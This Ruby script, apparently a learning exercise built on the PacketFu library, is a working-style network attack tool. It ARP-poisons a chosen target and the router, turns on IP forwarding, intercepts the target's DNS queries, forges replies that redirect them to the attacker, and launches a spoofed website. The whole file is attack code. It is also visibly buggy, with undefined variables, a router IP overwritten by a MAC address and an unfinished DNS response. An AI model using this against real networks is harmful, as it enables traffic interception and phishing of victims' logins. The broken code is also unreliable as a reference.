#!/usr/bin/env ruby

require 'packetfu'
require 'thread'

# Builds on the previous ARP spoofing example.
# The sending of ARP packets is done in a separate thread. 


## User defined variables
@target_ip   = "192.168.1.101"  # IP of the host you would like to target
@sender_ip   = "192.168.1.100"  # Your IP, or the attacking IP (MITM)
@router_ip   = "192.168.1.1"    # IP of the router on the network to ARP Poison
@iface       = "wlp2s0"         # Name of the primary network interface 

## DO NOT EDIT BELOW THIS LINE
# Functions
def runspoof(arp_packet_target,arp_packet_router)
  # Send out both packets
  puts "Spoofing...."
  caught=false
  while caught==false do
    sleep 1
    arp_packet_target.to_w(@iface)
    arp_packet_router.to_w(@iface)
  end
end

def get_machine_addr(ip)
  PacketFu::Utils.arp(ip, :iface => @iface)
end

def spoof_dns(t_ip)
  #look for dns packets from target
  filter = "udp and port 53 and src " + t_ip

  cap = PacketFu::Capture.new(:iface => @iface,
    :start => true,
    :promisc => true,
    :filter=> filter)
  cap.stream.each do |p|
    pkt = PacketFu::Packet.parse(p)
    if pkt.is_udp?
      dns_hdr_flag = pkt.payload[2].to_s + pkt.payload[3].to_s

      #check if query
      if dns_hdr_flag == '10'
        #extract domain name
        domain_name = extract_domain(pkt.payload[3.to_s])
        puts "Domain name is: #{name}"

        #build and send response
        send_dns_response(pkt, domain_name)
      end
    end
  end
end

def extract_domain(q_name)
  #take q name and extract all subdomains
  name = ""
  loop {
    len = q_name[0].to_i
    if len == 0
      name = name[0, name.length - 1]
      return name
    elsif len > 0
        len > 0
      name += q_name[1, len] + "."
      q_name = q_name[len + 1..-1]
    else len < 0 # should never be negative
      return nil
    end
  }
end

def send_dns_response(orig_pkt, name)

  #UDP/IP headers
  dns_resp = PacketFu::UDPPacket.new(:config => PacketFu::Utils.whoami?(:iface => @iface))
  dns_resp.eth_saddr = @sender_mac
  dns_resp.eth_daddr = @target_mac
  dns_resp.udp_dst = orig_pkt.udp_src
  dns_resp.udp_src = orig_pkt.udp_dst
  dns_resp.ip_saddr = orig_pkt.ip_daddr
  dns_resp.ip_daddr = @target_ip

  #DNS header
  #copy transaction ID from original query to response
  dns_resp.payload = orig_pkt.payload[0,2]
  #response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"

  #Domain Name

  #Rest of DNS Header (defaults)

  #Spoofed IP
  ip_ary = @sender_ip.split('.')
  dns_resp.payload += [ip_ary[0].to_i, ip_ary[1].to_i, ip_ary[2].to_i, ip_ary[3].to_i].pack('c*')

  #Bundle and send
  dns_resp.recalc
  dns_resp.to_w(@iface)
end

## Main
=begin
@target_mac  = "b8:ac:6f:34:ad:d8"
@sender_mac  = "7c:7a:91:7d:2b:02"
@router_mac  = "00:22:6b:7c:9b:12"
=end

@target_mac = get_machine_addr(@target_ip)
@sender_mac = get_machine_addr(@sender_ip)
@router_ip  = get_machine_addr(@router_ip)

# Construct the target's packet
arp_packet_target = PacketFu::ARPPacket.new()
arp_packet_target.eth_saddr = @sender_mac       # sender's MAC address
arp_packet_target.eth_daddr = @target_mac       # target's MAC address
arp_packet_target.arp_saddr_mac = @sender_mac   # sender's MAC address
arp_packet_target.arp_daddr_mac = @target_mac   # target's MAC address
arp_packet_target.arp_saddr_ip = @router_ip     # router's IP
arp_packet_target.arp_daddr_ip = @target_ip     # target's IP
arp_packet_target.arp_opcode = 2                # arp code 2 == ARP reply
 
# Construct the router's packet
arp_packet_router = PacketFu::ARPPacket.new()
arp_packet_router.eth_saddr = @sender_mac       # sender's MAC address
arp_packet_router.eth_daddr = @router_mac       # router's MAC address
arp_packet_router.arp_saddr_mac = @sender_mac   # sender's MAC address
arp_packet_router.arp_daddr_mac = @router_mac   # router's MAC address
arp_packet_router.arp_saddr_ip = @target_ip     # target's IP
arp_packet_router.arp_daddr_ip = @router_ip     # router's IP
arp_packet_router.arp_opcode = 2                # arp code 2 == ARP reply

# Enable IP forwarding
`echo 1 > /proc/sys/net/ipv4/ip_forward`

begin
  puts "Starting the ARP poisoning thread..."
  spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)} 
  puts "Starting the DNS spoofing thread..."
  dns_thread = Thread.new{spoof_dns(target_ip)}
  puts "Starting the spoofed website thread..."
  web_thread = Thread.new{`ruby site.rb`}
  spoof_thread.join
  dns_thread.join
  web_thread.join
rescue Interrupt # Catch the interrupt and kill the thread
  puts "\nARP spoof stopped by interrupt signal."
  Thread.kill(spoof_thread)
  puts "DNS spoof stopped by interrupt signal."
  Thread.kill(dns_thread)
  puts "Web spoof stopped by interrupt signal."
  Thread.kill(web_thread)
  `echo 0 > /proc/sys/net/ipv4/ip_forward`
  exit 0
end